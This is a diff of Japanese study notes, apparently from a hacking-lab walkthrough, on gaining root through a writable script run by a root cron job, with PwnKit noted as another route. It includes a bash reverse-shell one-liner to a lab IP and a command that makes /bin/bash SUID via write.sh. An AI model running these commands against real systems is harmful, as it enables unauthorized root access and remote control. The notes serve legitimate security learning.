@@ -39,20 +39,25 @@
   - pkexecがある`version 0.105`
   - `PwnKit`ができる
 - `ps aux | grep root`
-  - だいたいいつものcronとapacheが動いている
-  - crontabをチェックしてみる
+  - だいたいいつものcronとapacheが動いている。cronの設定はcrontabに書いてあるので、crontabをチェックしてみる
 - (補足) サイトのサーバ内での場所
   - phpinfo.phpで設定ファイルが見れる。その中にDocument_Rootがあって、そこに/var/www/htmlと書いてある。それで、そのDocument_Rootはどこで設定されているかというと、Server_rootに書いてある/var/www/ 
 - `cat /etc/crontab`
   - 開けたファイルの一番下にfinally.shがルート権限で実行されているのがわかる。ちなみにcrontabに直接スクリプトが書いてあるのは珍しい、何も見れない時はpspyを使う 
   - `cat /var/www/html/finally.sh`
+  - finally.shは書き込みができないので中の,write.shに書き込めるかチェックする
+  - とりあえずファイルのところへ移動する。`cd /var/www/html`
   - finally.shの中にwrite.shがある。5分ごとに実行されているのがわかる
-  - `ls -l`でパーミッションを見たら書き込みできる 
-- root取得の方法は3つ。ここでは(3)が楽なので、これでする
-  - (1)バックドアをつける
-  - (2)reverse-shellでrootになる
-    - `bash -c 'exec bash -i &>/dev/tcp/192.168.56.104/9001 <&1'`
-  - (3) bashをSUIDファイルにする
-    - `echo 'chmod +s /bin/bash' >> write.sh`
-    - `ls -l`でsになったら。次のコマンド
-    - `bash -p`
+  - `write.sh`は`ls -l`でパーミッションを見たら書き込みできる
+- cronが、動いているのを確認する
+  - `systemctl | grep cron` これがloaded active runningになっていたら動いている
+  - または
+  - `journalctl -f` ここにrootで./finally.shが動いているのが確認できる  
+- cronの書き込みでroot取得の方法は3つ。ここでは(3)が楽なので、これでする
+- (1)バックドアをつける(ハッキングラボの7のevilboxのバックドアを仕込むに詳しく書いてある)
+- (2)reverse-shellでrootになる
+  - `bash -c 'exec bash -i &>/dev/tcp/192.168.56.104/9001 <&1'`
+- (3) bashをSUIDファイルにする
+  - `echo 'chmod +s /bin/bash' >> write.sh`
+  - `ls -l`でsになったら。次のコマンド
+  - `/bin/bash -p`
